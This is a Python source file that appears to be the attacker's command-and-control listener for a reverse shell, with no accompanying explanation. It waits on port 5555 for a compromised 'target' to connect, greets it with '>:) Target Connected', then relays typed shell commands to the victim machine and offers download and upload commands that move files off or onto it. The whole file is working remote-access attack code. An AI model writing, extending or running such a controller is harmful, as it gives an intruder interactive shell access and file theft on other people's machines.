import socket
import json
import os

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode('utf-8'))

def reliable_recieve():
    data = ""
    while True:
        try:
            data += target.recv(1024).decode('utf-8', errors='replace')
            return json.loads(data)
        except ValueError:
            continue

def download_file(filename):
    f = open(filename,'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()        

def upload_file(filename):
    f = open(filename,'rb')
    target.send(f.read())

def target_comm():
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command[:3] == 'cd ':
            pass
        elif command == 'clear':
            os.system('clear')
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        else:
            result = reliable_recieve()
            print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('Enter your ip', 5555))
print(':) Listening for connections...')
sock.listen(5)
target, ip = sock.accept()
confirmation = target.recv(1024).decode('utf-8')
print(f">:) Target Connected From {str(ip)}, Confirmation: {confirmation}")
target_comm()